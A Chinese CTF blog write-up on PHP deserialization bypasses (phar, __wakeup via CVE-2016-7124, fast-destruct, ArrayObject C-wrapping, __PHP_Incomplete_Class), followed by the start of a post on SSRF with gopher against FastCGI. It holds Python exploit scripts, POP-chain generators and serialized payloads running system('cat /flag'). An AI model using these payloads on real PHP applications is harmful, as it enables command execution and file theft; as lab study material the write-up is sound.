因此我们只能将目光投向到A类，其中依旧是要触发析构函数，有两个功能，一个是写入文件，一个是读取文件，并且函数是我们熟知的可以配合phar进行反序列化的函数。 那么思路有了：首先通过文件写入函数，写入phar数据（其中的数据为我们要反序列化的getflag类），接着通过文件读取函数，读取phar文件触发反序列化，拿到flag。 接下来先编写phar &lt;?php //ini_set(\"phar.readonly\", 0); class getflag { } //@unlink(\"phar.phar\"); $phar = new Phar(\"1.phar\"); //后缀名必须为phar $phar-&gt;startBuffering(); $phar-&gt;setStub(\"&lt;?php __HALT_COMPILER();?&gt;\"); //设置stub $a = new getflag(); $a = array($a, 0); $phar-&gt;setMetadata($a); //将自定义的meta-data存入manifest $phar-&gt;addFromString(\"test.txt\", \"test\"); //添加要压缩的文件 //签名自动计算 $phar-&gt;stopBuffering(); ?&gt; 但这里值得注意的点是，在phar反序列化的时候，如下图标记处，可以看到这里的Metadata属性引用了我们的$a，这会导致在反序列化的时候，会触发题目的异常而无法调用析构函数，因此需要采用反序列化数组绕过 这里对生成的phar文件，用010打开后修改数组索引，之后需要重新计算phar签名 数组绕过 修改成功，接下来就是绕过正则了，这里采用数组绕过，或者通过gzip等协议压缩也可，这样其内部数据就不是明文了，也就绕过了关键字的过滤。–这里先用数组绕过，脚本如下： import requests import re url=\"http://node4.anna.nssctf.cn:28672/\" ### 写入phar文件 with open(\"phar.phar\",'rb') as f: data1={'0[]':f.read()} #传数组绕过，值就是phar.phar文件的内容 param1 = {0: 'O:1:\"A\":1:{s:6:\"config\";s:1:\"w\";}'} res1 = requests.post(url=url, params=param1,data=data1) ### 读phar文件，获取flag param2={0:'O:1:\"A\":1:{s:6:\"config\";s:1:\"r\";}'} data2={0:\"phar://tmp/a.txt\"}#phar解析是看文件格式的，并非看后缀名 res2=requests.post(url=url,params=param2,data=data2) flag=re.compile('NSSCTF\\{.*?\\}').findall(res2.text) print(flag) 得到flag gzip压缩绕过 gzip bzip2 tar zip 这四个后缀同样也支持phar://读取 import requests import gzip import re url = 'http://node4.anna.nssctf.cn:28672/' with open(\"D:\\\\PphProject\\\\Scripts\\ ewtest.phar\", \"rb\") as f1: phar_zip = gzip.open(\"gzip.zip\", \"wb\") phar_zip.writelines(f1) phar_zip.close() with open(\"phar.zip\", \"rb\") as f2: data1 = { 0:f2.read() } params1 = { 0:'O:1:\"A\":1:{s:6:\"config\";s:1:\"w\";}' } requests.post(url=url, params=params1, data=data1) params2 = { 0:'O:1:\"A\":1:{s:6:\"config\";s:1:\"r\";}' } data2 = { 0:\"phar://tmp/a.txt\" } res = requests.post(url=url, params=params2, data=data2) flag = re.compile('NSSCTF\\{.*?\\}').findall(res.text) print(flag) tar压缩绕过 在guoke师傅的文章中有PHP对tar文件的phar://的底层处理源码分析，其中有涉及到.phar/.metadata这个文件，这里只讲怎么操作 先新建一个.phar文件夹，在文件夹中新建.metadata文件，内容直接写入a:2:{i:0;O:7:\"getflag\":0:{}i:0;N;} 将文件夹拖入Linux中，tar -cf tartest.tar .phar/生成新文件后再对新文件gzip一下得到tartest.tar.gz文件，再POST这个文件的内容，再读取获得flag （这里需要注意，.phar在Linux中显示为隐藏文件，所以拖入后可能会看不见，利用ls -al可以看到） 具体原理看参考文章 cve-2016-7124绕过 这个是最常见的，就简单过一下 影响范围： PHP5 &lt; 5.6.25 PHP7 &lt; 7.0.10 正常来说在反序列化过程中，会先调用wakeup()方法再进行unserilize()，但如果序列化字符串中表示对象属性个数的值大于真实的属性个数时，wakeup()的执行会被跳过。 但看了篇文章，发现这里还大有说法？？？ 绕过原理： 反序列化后由于属性值个数不匹配，被PHP当作垃圾回收。（本质是GC回收机制），进一步探索，如果换成类包类的情况，就是类属性还是一个类。 //正常payload O:1:“A”:2:{s:4:“info”;O:1:“B”:1:{s:3:“end”;N;}s:3:“end”;s:1:“1”;} //内部类属性数量不一致，只触发外部类的__destruct() O:1:“A”:2:{s:4:“info”;O:1:“B”:2:{s:3:“end”;N;}s:3:“end”;s:1:“1”;} //外部类属性数量不一致，先外类__destruct()后内类__wakeup() O:1:“A”:3:{s:4:“info”;O:1:“B”:1:{s:3:“end”;N;}s:3:“end”;s:1:“1”;} 原理： 反序列化，它是先从外面开始反序列化，而不是里面。通俗讲，就是类A里面的属性是类B，则先反序列化类A再反序列化类B。 内部类属性数量不一致，直接把内部类当垃圾回收，所以不触发内部类__wakeup()，只触发外部类的__destruct()。 外部类属性数量不一致，外部类直接被当成垃圾回收，先触发了外部类__destruct()，而内部类正常，就正常触发内部类__wakeup()。 这听起来像fast-destruct，不是像，就是同一个东西，其实本质上都是PHP的GC回收机制罢了。 php引用赋值绕过 在php里，我们可使用引用的方式让两个变量同时指向同一个内存地址，这样对其中一个变量操作时，另一个变量的值也会随之改变。 比如： &lt;?php function test (&amp;$a){ $x=&amp;$a; $x='123'; } $a='11'; test($a); echo $a; //输出 123 ?&gt; 可以看到这里我们虽然最初$a=‘11’，但由于我们通过$x=&amp;$a使两个变量同时指向同一个内存地址了，所以使$x='123’也导致$a='123’了，举个例子： &lt;?php class KeyPort{ public $key; public function __destruct() { $this-&gt;key=False; if(!isset($this-&gt;wakeup)||!$this-&gt;wakeup){ echo \"You get it!\"; } } public function __wakeup(){ $this-&gt;wakeup=True; } } if(isset($_POST['pop'])){ @unserialize($_POST['pop']); } ?&gt; 如果反序列化，那wakeup变量一定为true，那if(!isset($this-&gt;wakeup)||!$this-&gt;wakeup)就不可能绕过，如果此时无法通过修改属性值个数绕过的话。就可以尝试引用，我们注意到key的值为false 那如果此时我们这样写： $this-&gt;key=False; $this-&gt;key=&amp;this-&gt;wakeup //或者 $keyport = new KeyPort(); $keyport-&gt;key=&amp;$keyport-&gt;wakeup; 即可成功绕过 fast-destruct绕过 引用一下大佬的解释： 在PHP中如果单独执行unserialize()函数，则反序列化后得到的生命周期仅限于这个函数执行的生命周期，在执行完unserialize()函数时就会执行__destruct()方法 而如果将unserialize()函数执行后得到的字符串赋值给了一个变量，则反序列化的对象的生命周期就会变长，会一直到对象被销毁才执行析构方法 我们可以看到DASCTF X GFCTF 2022十月挑战赛里EasyPOP这道题，源码是： &lt;?php highlight_file(__FILE__); error_reporting(0); class fine { private $cmd; private $content; public function __construct($cmd, $content) { $this-&gt;cmd = $cmd; $this-&gt;content = $content; } public function __invoke() { call_user_func($this-&gt;cmd, $this-&gt;content); } public function __wakeup() { $this-&gt;cmd = \"\"; die(\"Go listen to Jay Chou's secret-code! Really nice\"); } } class show { public $ctf; public $time = \"Two and a half years\"; public function __construct($ctf) { $this-&gt;ctf = $ctf; } public function __toString() { return $this-&gt;ctf-&gt;show(); } public function show(): string { return $this-&gt;ctf . \": Duration of practice: \" . $this-&gt;time; } } class sorry { private $name; private $password; public $hint = \"hint is depend on you\"; public $key; public function __construct($name, $password) { $this-&gt;name = $name; $this-&gt;password = $password; } public function __sleep() { $this-&gt;hint = new secret_code(); } public function __get($name) { $name = $this-&gt;key; $name(); } public function __destruct() { if ($this-&gt;password == $this-&gt;name) { echo $this-&gt;hint; } else if ($this-&gt;name = \"jay\") { secret_code::secret(); } else { echo \"This is our code\"; } } public function getPassword() { return $this-&gt;password; } public function setPassword($password): void { $this-&gt;password = $password; } } class secret_code { protected $code; public static function secret() { include_once \"hint.php\"; hint(); } public function __call($name, $arguments) { $num = $name; $this-&gt;$num(); } private function show() { return $this-&gt;code-&gt;secret; } } if (isset($_GET['pop'])) { $a = unserialize($_GET['pop']); $a-&gt;setPassword(md5(mt_rand())); } else { $a = new show(\"Ctfer\"); echo $a-&gt;show(); } 可以看到这里有个难点就是wakeup的绕过： public function __wakeup() { $this-&gt;cmd = \"\"; die(\"Go listen to Jay Chou's secret-code! Really nice\"); } exp: &lt;?php class sorry { public $name; public $password; public $key; public $hint; } class show { public $ctf; } class secret_code { public $code; } class fine { public $cmd; public $content; public function __construct() { $this-&gt;cmd = 'system'; $this-&gt;content = ' /'; } } $a=new sorry(); $b=new show(); $c=new secret_code(); $d=new fine(); $a-&gt;hint=$b; $b-&gt;ctf=$c; $e=new sorry(); $e-&gt;hint=$d; $c-&gt;code=$e; $e-&gt;key=$d; echo (serialize($a)); #O:5:\"sorry\":4:{s:4:\"name\";N;s:8:\"password\";N;s:3:\"key\";N;s:4:\"hint\";O:4:\"show\":1:{s:3:\"ctf\";O:11:\"secret_code\":1:{s:4:\"code\";O:5:\"sorry\":4:{s:4:\"name\";N;s:8:\"password\";N;s:3:\"key\";O:4:\"fine\":2:{s:3:\"cmd\";s:6:\"system\";s:7:\"content\";s:2:\" /\";}s:4:\"hint\";r:10;}}}} 直接传进去毫无疑问会因为die()而终止，这里我们就可以用fast-destruct这个技巧使destruct提前发生以绕过wakeup()，比如我们可以减少一个} ： ?pop=O:5:\"sorry\":4:{s:4:\"name\";N;s:8:\"password\";N;s:3:\"key\";N;s:4:\"hint\";O:4:\"show\":1:{s:3:\"ctf\";O:11:\"secret_code\":1:{s:4:\"code\";O:5:\"sorry\":4:{s:4:\"name\";N;s:8:\"password\";N;s:3:\"key\";O:4:\"fine\":2:{s:3:\"cmd\";s:6:\"system\";s:7:\"content\";s:9:\"cat /flag\";}s:4:\"hint\";r:10;}}} 或者在r;10;后面加一个1： ?pop=O:5:\"sorry\":4:{s:4:\"name\";N;s:8:\"password\";N;s:3:\"key\";N;s:4:\"hint\";O:4:\"show\":1:{s:3:\"ctf\";O:11:\"secret_code\":1:{s:4:\"code\";O:5:\"sorry\":4:{s:4:\"name\";N;s:8:\"password\";N;s:3:\"key\";O:4:\"fine\":2:{s:3:\"cmd\";s:6:\"system\";s:7:\"content\";s:9:\"cat /flag\";}s:4:\"hint\";r:10;1}}}} 都可以实现wakeup绕过，也有下面的绕过方法 本质上就是利用GC回收机制，方法有两种，删除末尾的花括号、数组对象占用指针（改数字） $a = new a(); arry = array( arry = array(arry=array(a,“1234”); result= serialize(result=serialize(result=serialize(arry); echo $result; //正常payload： a:2:{i:0;O:1:“a”:1:{s:1:“a”;s:3:“123”;}i:1;s:4:“1234”;} //删除末尾花括号 a:2:{i:0;O:1:“a”:1:{s:1:“a”;s:3:“123”;}i:1;s:4:“1234”; //数组对象占用指针（加粗部分数组下标和前面重复都是0，导致指针出问题） a:2:{i:0;O:1:“a”:1:{s:1:“a”;s:3:“123”;}i:0;s:4:“1234”;} 属性键长度不匹配绕过 也叫 php issue#9618，版本条件： 7.4.x -7.4.30 8.0.x //正常payload O:1:“A”:2:{s:4:“info”;O:1:“B”:1:{s:3:“end”;N;}s:4:“Aend”;s:1:“1”;} //外部类属性键长度异常payload： //先外类__destruct()后内类__wakeup() O:1:“A”:2:{s:4:“info”;O:1:“B”:1:{s:3:“end”;N;}s:6:“Aend”;s:1:“1”;} 属性值的长度不匹配绕过 //正常payload O:1:“A”:2:{s:4:“info”;O:1:“B”:1:{s:3:“end”;N;}s:4:“Aend”;s:1:“1”;} //外部类属性值长度异常payload： //先外类__destruct()后内类__wakeup() O:1:“A”:2:{s:4:“info”;O:1:“B”:1:{s:3:“end”;N;}s:4:“Aend”;s:2:“1”;} O:1:“A”:2:{s:4:“info”;O:1:“B”:1:{s:3:“end”;N;}s:4:“Aend”;s:1:“12”;} 对此稍微总结一下，前面我们的绕过方法无非就是修改数组索引、删除分号、删除花括号、修改属性值和属性键的长度。接下来认真分析分析是如何绕过的：这里有一个点就是fast-destruct的本质是序列化的字符串格式不对导致反序列失败反而成为垃圾数据然后触发强行GC 对于这个payload //删除花括号 ?pop=O:5:\"sorry\":4:{s:4:\"name\";N;s:8:\"password\";N;s:3:\"key\";N;s:4:\"hint\";O:4:\"show\":1:{s:3:\"ctf\";O:11:\"secret_code\":1:{s:4:\"code\";O:5:\"sorry\":4:{s:4:\"name\";N;s:8:\"password\";N;s:3:\"key\";O:4:\"fine\":2:{s:3:\"cmd\";s:6:\"system\";s:7:\"content\";s:9:\"cat /flag\";}s:4:\"hint\";r:10;}}} //末位添加数字1 ?pop=O:5:\"sorry\":4:{s:4:\"name\";N;s:8:\"password\";N;s:3:\"key\";N;s:4:\"hint\";O:4:\"show\":1:{s:3:\"ctf\";O:11:\"secret_code\":1:{s:4:\"code\";O:5:\"sorry\":4:{s:4:\"name\";N;s:8:\"password\";N;s:3:\"key\";O:4:\"fine\":2:{s:3:\"cmd\";s:6:\"system\";s:7:\"content\";s:9:\"cat /flag\";}s:4:\"hint\";r:10;1}}}} 这里我们知道的是，如果该序列化字符串内部含有多个类，他反序列化的时候会由外向内进行。对于上述payload，它的修改处都是针对的最内部的类，这样的话PHP在解析的时候认为该类格式有问题，直接被GC认定为垃圾而调用析构函数去回收。 接下来继续看其他payload //正常payload O:1:“A”:2:{s:4:“info”;O:1:“B”:1:{s:3:“end”;N;}s:4:“Aend”;s:1:“1”;} //外部类属性键长度异常payload： //先外类__destruct()后内类__wakeup() O:1:“A”:2:{s:4:“info”;O:1:“B”:1:{s:3:“end”;N;}s:6:“Aend”;s:1:“1”;}//修改为了6 //正常payload O:1:“A”:2:{s:4:“info”;O:1:“B”:1:{s:3:“end”;N;}s:4:“Aend”;s:1:“1”;} //外部类属性值长度异常payload： //先外类__destruct()后内类__wakeup() O:1:“A”:2:{s:4:“info”;O:1:“B”:1:{s:3:“end”;N;}s:4:“Aend”;s:2:“1”;} O:1:“A”:2:{s:4:“info”;O:1:“B”:1:{s:3:“end”;N;}s:4:“Aend”;s:1:“12”;}//修改为了12 可以看到上面进行了修改外部类的数字，那进行反序列化的时候，内部类被认为是正常的，则调用内部类的wakeup，之后在处理外部类，当看到外部类长度不匹配，于是认为是垃圾，直接调用析构函数回收。 这里也就说明了上述cve的绕过，是改变类属性的值，其本质也是一样的。 此时我们又可以想到修改内部类的属性值、属性键等等的长度 O:1:\"A\":2:{s:4:\"info\";O:1:\"B\":1:{s:3:\"end\";N;}s:3:\"end\";s:1:\"1\";} //正常 O:1:\"A\":2:{s:4:\"info\";O:1:\"B\":2:{s:3:\"end\";N;}s:3:\"end\";s:1:\"1\";} //payload 这里可以看到他修改了内部B类的属性个数，这会导致反序列化的时候，PHP认为B有问题，直接调用析构消除，之后外部的A类会正常反序列化 O:1:\"A\":3:{s:4:\"info\";O:1:\"B\":1:{s:3:\"end\";N;}s:3:\"end\";s:1:\"1\";}//修改外部属性 那这里就是第一个cve的绕过了，他会先执行B类的wakeup方法、接着认为A不正常，不会执行A的wakeup直接调用析构消除。等等等等，这里肯定还有很多的引申，比如删除内部类的分号、花括号等等。 说了这么多，其实就是我们在遇到必须得绕过wakeup的时候，可以看看该方法在哪个类下面，那我们就让哪个类的序列化数据不正常，从而直接调用该类的析构函数而绕过wakeup。 使用C绕过 版本限制： 5.3.0 - 5.3.29 5.4.0 - 5.4.45 5.5.0 - 5.5.38 5.6.0 - 5.6.40 7.0.0 - 7.0.33 7.1.0 - 7.1.33 7.2.0 - 7.2.34 7.3.0 - 7.3.28 7.4.0 - 7.4.16 8.0.0 - 8.0.3 C是因为PHP 5 中增加了接口（interface）功能。PHP 5 本身提供了一个 Serializable 接口，如果用户在自己定义的类中实现了这个接口，那么在该类的对象序列化时，就会被按照用户实现的方式去进行序列化，并且序列化后的标示不再是 O，而改为 C。C 标示的格式如下： C:&lt;name length&gt;:\"&lt;class name&gt;\":&lt;data length&gt;:{&lt;data&gt;} 其中 &lt;name length&gt; 表示类名 &lt;class name&gt;的长度，&lt;data length&gt;表示自定义序列化数据&lt;data&gt;的长度，而自定义的序列化数据 &lt;data&gt; 是完全的用户自己定义的格式，与 PHP 序列化格式可以完全无关，这部分数据由用户自己实现的序列化和反序列化接口方法来管理。 Serializable接口中定义了 2 个方法，serialize()和 unserialize($data)，这两个方法不会被直接调用，而是在调用 PHP 序列化函数时，被自动调用。其中serialize函数没有参数，它的返回值就是&lt;data&gt;的内容。而unserialize($data)有一个参数$data，这个参数的值就是 &lt;data&gt;的内容。 C可以用来绕过_wakeup，因为custom object并不支持__wakeup()，不过C需要实现unserialize才能绑定上属性值。 也就是说，使用C代替O能绕过wakeup，但那样的话只能执行construct()函数或者destruct()函数，无法添加任何内容，就是把正常的反序列化进行一次打包，让最后生成的payload以C开头即可。 那如果我们在遇到对象有属性的时候如何使用C绕过呢？ 网上看到佬们选择用内置类绕过，比如ArrayObject &lt;?php $arr=array(\"a\"=&gt;1,\"b\"=&gt;2); $ao=new ArrayObject($arr); echo serialize($ao); 可以看到是C开头的，既然是C开头的，假如我们遇到了这样的题目 2023愚人杯-easy_php &lt;?php error_reporting(0); highlight_file(__FILE__); class ctfshow{ public function __wakeup(){ die(\"not allowed!\"); } public function __destruct(){ system($this-&gt;ctfshow); } } $data = $_GET['1+1&gt;2']; if(!preg_match(\"/^[Oa]:[\\d]+/i\", $data)){ unserialize($data); } ?&gt; 这里的正则让我们不能以O或者a开头，这里对于以前的正则绕过办法都行不通 &lt;?php class ctfshow{ public function __wakeup(){ die(\"not allowed!\"); } public function __destruct(){ system($this-&gt;ctfshow); } } $a=new ctfshow(); echo serialize($a); #O:7:\"ctfshow\":0:{}//做这个payload很明显绕过不了 这里我们可以使用ArrayObject对正常的反序列化进行一次包装，让最后输出的payload以C开头。这里官方文档说： 支持参数为数组，也就是说我们可以将待反序列化的字符串，经过该内置类的包装即可。因为ArrayObject，他是C开头的，并且可以绕过O，然后还可以带属性反序列化，符合条件，因此可以构造payload： &lt;?php class ctfshow { public $ctfshow; } $pop = new ctfshow(); $pop-&gt;ctfshow = 'ls /'; $arr = array('hybcx'=&gt;$pop); echo serialize(new ArrayObject($arr)) ?&gt; 值得注意的点是，这里进行url传参的时候需要对变量中的加号进行url编码，否则会被识别为空格而无法正常传参，最后成功命令执行 最后这位佬还找到了其他可以进行包装的内置类 &lt;?php $classes = get_declared_classes();foreach ($classes as $class) { $methods = get_class_methods($class); foreach ($methods as $method) { if (in_array($method, array( 'unserialize', ))) { print $class . '::' . $method . \" \"; } }} 经过所有测试发现可以用的类为： ArrayObject::unserialize ArrayIterator::unserialize RecursiveArrayIterator::unserialize SplObjectStorage::unserialize SplDoublyLinkedList::unserialize SplQueue::unserialize SplStack::unserialize 字符i、d绕过 条件： &lt;8.0.3 （全版本） &lt;?php echo unserialize('i:-1;'); echo \" \"; echo unserialize('i:+1;'); echo \" \"; echo unserialize('d:-1.1;'); echo \" \"; echo unserialize('d:+1.2;'); //输出如下 -1 1 -1.1 1.2 ?&gt; 这里暂时不清楚能绕过什么。。。 stdClass与__PHP_Incomplete_Class 绕过 所有的类都是stdClass类的子类，stdClass是所有类的基类，下面就直接用佬的图了 在PHP中，当我们在反序列化一个不存在的类时，会发生什么呢 &lt;?php $raw = 'O:1:\"A\":1:{s:1:\"a\";s:1:\"b\";}'; var_dump(unserialize($raw)); /*Output: object(__PHP_Incomplete_Class)#1 (2) { [\"__PHP_Incomplete_Class_Name\"]=&gt; string(1) \"A\" [\"a\"]=&gt; string(1) \"b\" }*/ 可以发现PHP在遇到不存在的类时，会把不存在的类转换成__PHP_Incomplete_Class这种特殊的类，同时将原始的类名A存放在__PHP_Incomplete_Class_Name这个属性中，其余属性存放方式不变。 而我们在序列化这个对象的时候，serialize遇到__PHP_Incomplete_Class这个特殊类会倒推回来，序列化成__PHP_Incomplete_Class_Name值为类名的类，我们看到的序列化结果不是O:22:\"__PHP_Incomplete_Class_Name\":2:{xxx}而是O:1:\"A\":1:{s:1:\"a\";s:1:\"b\";},那么如果我们自己如下构造序列化字符串 执行结果如下图 可以看到在二次序列化后，由于O:22:\"__PHP_Incomplete_Class\":1:{s:1:\"a\";O:7:\"classes\":0:{}}中__PHP_Incomplete_Class_Name为空，找不到应该绑定的类，其属性就被丢弃了 强网杯2021 WhereIsUWebShell 这里网上似乎找不到靶场了，只能跟着过一遍 &lt;?php // index.php ini_set('display_errors', 'on'); include \"function.php\"; $res = unserialize($_REQUEST['ctfer']); if(preg_match('/myclass/i',serialize($res))){ throw new Exception(\"Error: Class 'myclass' not found \"); } highlight_file(__FILE__); echo \"&lt;br&gt;\"; highlight_file(\"myclass.php\"); echo \"&lt;br&gt;\"; highlight_file(\"function.php\"); 可以看到这里只加载了function.php文件，并且对ctfer进行一次反序列化，之后在序列化判断其中有没有myclass关键字，如果有则抛出异常 用到的其他文件如下 &lt;?php // myclass.php class Hello{ public function __destruct() { if($this-&gt;qwb) echo file_get_contents($this-&gt;qwb); } } ?&gt; &lt;?php // function.php function __autoload($classname){ require_once \"./$classname.php\"; } ?&gt; 这里可以详细了解一下__autoload的用法，例如相同目录下有这样几个文件 User.class.php; Person.class.php; Message.class.php; index.php; 如果我们此时在相同目录下的index.php文件中这样写： function __autoload($className){ //ucfirst() 将字符串首字母变为大写 include(\"ucfirst($className)\".class.\".php\"); } //将类名User作为参数传入 $user=new User();//通过自动加载类调用User.class.php文件 $person=new Person();//通过自动加载类调用Person.class.php文件 $Message=new Message();//通过自动加载类调用Message.classphp文件 如上述代码所示，在当前文件中我们并没有对应的User、Person等类，当我们想使用的时候，会自动调用autoload方法，将类名作为参数传入，包含对应的文件。 function.php下是一个用来自动加载类的函数，比如当我们想加载一个index.php文件不存在的Hello类，我们可以通过加载一个myclass类，则function.php文件中的autoload方法的classname参数赋值为myclass，去自动的包含myclass.php文件。这样Hello类就得到了。 在这个题目中我们是想要加载Hello类来进行文件读取，但想要引入hello类就要classname为myclass的类。这个类并不存在，如果我们直接去反序列化，只会在反序列化myclass类的时候报错无法进入下一步，或者在反序列化Hello的时候找不到这个类而报错。因此就需要用到__PHP_Incomplete_Class的处理了 我们只需要在__PHP_Incomplete_Class其中添加myclass类，这样在第一次反序列化的时候是正常的，其中的myclass类会被放在__PHP_Incomplete_Class_Name中，我们可以按照如下的思路进行测试 我们先构造一个存在myclass与Hello类的文件 &lt;?php class Hello{ public $qwb; } class myclass{ } $pop = new Hello(); $pop-&gt;qwb = '/flag'; $pop1 = new myclass(); $arr = array($pop1, $pop); echo serialize($arr); //输出：a:2:{i:0;O:7:\"myclass\":0:{}i:1;O:5:\"Hello\":1:{s:3:\"qwb\";s:5:\"/flag\";}} ?&gt; 之后我们可以删除上面两个类进一步测试 &lt;?php $pop2 = 'a:2:{i:0;O:7:\"myclass\":0:{}i:1;O:5:\"Hello\":1:{s:3:\"qwb\";s:5:\"/flag\";}}'; var_dump(unserialize($pop2)); array(2) { [0]=&gt; object(__PHP_Incomplete_Class)#1 (1) { [\"__PHP_Incomplete_Class_Name\"]=&gt; string(7) \"myclass\" } [1]=&gt; object(__PHP_Incomplete_Class)#2 (2) { [\"__PHP_Incomplete_Class_Name\"]=&gt; string(5) \"Hello\" [\"qwb\"]=&gt; string(5) \"/flag\" } } 如上面所示，这里输出的内容我们可以看到含有了__PHP_Incomplete_Class_Name的存在，但接下来的构造似乎得手搓了。让我们这样构造 a:2:{i:0;O:22:\"__PHP_Incomplete_Class\":1:{s:3:\"bcx\";O:7:\"myclass\":0:{}}i:1;O:5:\"Hello\":1:{s:3:\"qwb\";s:5:\"/flag\";}} 这里的话参考上面的输出是完全可以手搓的，这里感觉注意的点就是在描述__PHP_Incomplete_Class的时候似乎需要为其添加一个字符串属性，如上面这样写s:3:\"bcx\";O:7:\"myclass\"实际就是bcx=new myclass() &lt;?php $raw = 'O:1:\"A\":1:{s:1:\"a\";s:1:\"b\";}'; var_dump(unserialize($raw)); /*Output: object(__PHP_Incomplete_Class)#1 (2) { [\"__PHP_Incomplete_Class_Name\"]=&gt; string(1) \"A\" [\"a\"]=&gt; string(1) \"b\" }*/ 感觉就如同上述例子一般如果我们将__PHP_Incomplete_Class_Name除去的话，由于前者__PHP_Incomplete_Class描述的是其含有两个属性A和B，那么修改的时候就应该这样 object(__PHP_Incomplete_Class)#1 (2) { [\"b\"]=&gt; //这里得有变量指向后面的字符串A，因此这里需要添加一个自定义的变量 string(1) \"A\" [\"a\"]=&gt; string(1) \"b\" } 那对于我们题目的修改就应该这样 object(__PHP_Incomplete_Class)#1 (1) { [\"__PHP_Incomplete_Class_Name\"]=&gt; string(7) \"myclass\" } //转换成 object(__PHP_Incomplete_Class)#1 (1) { [\"bcx\"]=&gt; string(7) \"myclass\" } //再转换成 object(__PHP_Incomplete_Class)#1 (1) { [\"bcx\"]=&gt; object(7) \"myclass\" } 毕竟这里我们需要myclass被认作是一个类，因此最终要如下图构造 a:2:{i:0;O:22:\"__PHP_Incomplete_Class\":1:{s:3:\"bcx\";O:7:\"myclass\":0:{}}i:1;O:5:\"Hello\":1:{s:3:\"qwb\";s:5:\"/flag\";}} 这样的话在第一次反序列化的时候，他将myclass当做一个类，但当前文件没有该类，于是自动调用myclass.php文件，那么Hello类便被将在到当前文件了，接着后面反序列化Hello类的时候便会被正常解析不会报错。 但在后续序列化的对myclass关键词的检验中，由于我们的__PHP_Incomplete_Class_Name不存在，因此__PHP_Incomplete_Class识别不了后面的{s:3:\"bcx\";O:7:\"myclass\":0:{}}于是这一段代码便被删除。 最后我们也可以成功绕过了，对于上述题目我们也可以用刚刚学到的fast-destruct来绕过，即 #修改序列化数字元素个数 a:2:{i:0;O:7:\"myclass\":1:{s:1:\"a\";O:5:\"Hello\":1:{s:3:\"qwb\";s:5:\"/flag\";}}} #去掉序列化尾部 } a:1:{i:0;O:7:\"myclass\":1:{s:1:\"a\";O:5:\"Hello\":1:{s:3:\"qwb\";s:5:\"/flag\";}} 按照从左至右的解析顺序，这里a的属性值正确来讲是一个，但这里修改为了两个，很明显错了，那这里我认为就是存在PHP版本的问题了（GPT说的）如果PHP版本恰当且代码处理的不规范，有可能PHP会直接调用析构函数来尝试回收数组对象a，但考虑到上述我们题目中的析构函数有着对qwb变量的处理，PHP可能会依旧向内部解析，解析到qwb变量的时候将其赋值为/flag而成功读取。 对于第二个的话，他在解析到最后发现结构错误，于是调用析构函数去处理，但由于前面已经被正确实例化了，那么也是可以成功读取到flag的 这里我在与GPT唇枪舌战的时候发现一个问题，看了很多文章说PHP反序列化的时候如果 遇到是类中嵌套类的序列化字符串，会先反序列化内部类在反序列化外部类，不过这里问了GPT发现，PHP反序列化实际上就是从左至右依次解析的。 总的来说对于fast-destruct方法很多，大致就是构造出格式错误的情况，但对于我们构造的恶意代码的存在的地方基本是不能让其错误的。 最后还发现有个闭包函数绕过，但其中的链子没学过，就不深究了，放这里看日后有缘学习一下 PHP反序列化冷知识 0x03 参考文章 PHP反序列化小技巧之Fast Destruct --这个文章我认为可以很好的理解PHP反序列化的过程 愚人杯3rd [easy_php] 绕过__wakeup() 反序列化 合集 从0学习bypass open_basedir姿势 PHP反序列化中wakeup()绕过总结 wakeup魔术方法绕过 从虎符线下CTF深入反序列化利用 浅析PHP GC垃圾回收机制及常见利用方式 [php反序列化之绕过wakeup] PHP反序列化小技巧 prize1 prize_p1 phar反序列化+两道CTF例题 [phar反序列化][NSSCTF]prize_p1","tags":["基本知识"],"categories":["web知识总结"]},{"title":"SSRF gopher打FastCGI","path":"/2023/12/22/ssrf-da-fastcgi/","content":"0x01 前言 本文的产生是由于之前刷CTFHub靶场遇到的，看到自己对SSRF方面还是有所欠缺的，这里又遇到了新知识点，故此记录一下。 这里主要是利用gopher协议： 这个协议作为SSRF漏洞利用中的万金油，可以用它来攻击内网的FTP、Telnet、Redis、Memcache、FastCGI等应用，那么这篇文章就来介绍一下FastCGI以及利用SSRF结合Gopher协议攻击FastCGI 0x02 FastCGI 这里多为其他大师傅的知识总结，还请见谅~~ 这里先给出维基百科对其的解释： 快速通用网关接口（Fast Common Gateway Interface／FastCGI）是一种让交互程序与Web服务器通信的协议。FastCGI是早期通用网关接口（CGI）的增强版本。FastCGI致力于减少网页服务器与CGI程序之间交互的开销，从而使服务器可以同时处理更多的网页请求。 只通过这样简单两句话确实难以理解这是一个什么协议，下面是我通过阅读各种资料后对这个协议的理解 众所周知，在网站分类中存在一种分类就是静态网站和动态网站，两者的区别就是静态网站只需要通过浏览器进行解析，其中的页面是一对一的(一个内容对应一个页面)，而动态网站需要一个额外的编译解析的过程，网页上的数据是从数据库中或者其他地方调用，页面会随着数据的变化而改变，就产生了一定的交互性。 浏览器访问静态网页过程 在整个网页的访问过程中，Web容器(例如Apache、Nginx)只担任着内容分发者的身份，当访问静态网站的主页时，Web容器会到网站的相应目录中查找主页文件，然后发送给用户的浏览器。 浏览器访问动态网页过程 当访问动态网站的主页时，根据容器的配置文件，它知道这个页面不是静态页面，web容器就会去找PHP解析器来进行处理(这里以Apache为例)，它会把这个请求进行简单的处理，然后交给PHP解释器。 当Apache收到用户对 index.php 的请求后，如果使用的是CGI，会启动对应的 CGI 程序，对应在这里就是PHP的解析器。接下来PHP解析器会解析php.ini文件，初始化执行环境，然后处理请求，再以规定CGI规定的格式返回处理后的结果，退出进程，Web server再把结果返回给浏览器。这就是一个完整的动态PHP Web访问流程。 这里说的是使用CGI，而FastCGI就相当于高性能的CGI，与CGI不同的是它像一个常驻的CGI，在启动后会一直运行着，不需要每次处理数据时都启动一次， 所以这里引出下面这句概念，FastCGI是语言无关的、可伸缩架构的CGI开放扩展，其主要行为是将CGI解释器进程保持在内存中，并因此获得较高的性能 。 FastCGI Record HTTP协议是浏览器和服务器中间件进行数据交换的协议，浏览器将HTTP头和HTTP体用某个规则组装成数据包，以TCP的方式发送到服务器中间件，服务器中间件按照规则将数据包解码，并按要求拿到用户需要的数据，再以HTTP协议的规则打包返回给服务器。 类比HTTP协议来说，fastcgi协议则是服务器中间件和某个语言后端进行数据交换的协议。Fastcgi协议由多个record组成，record也有header和body一说，服务器中间件将这二者按照fastcgi的规则封装好发送给语言后端，语言后端解码以后拿到具体数据，进行指定操作，并将结果再按照该协议封装好后返回给服务器中间件。 和HTTP头不同，record的头固定8个字节，body是由头中的contentLength指定，其结构如下： typedef struct { /* Header */ unsigned char version; // 版本 unsigned char type; // 本次record的类型 unsigned char requestIdB1; // 本次record对应的请求id unsigned char 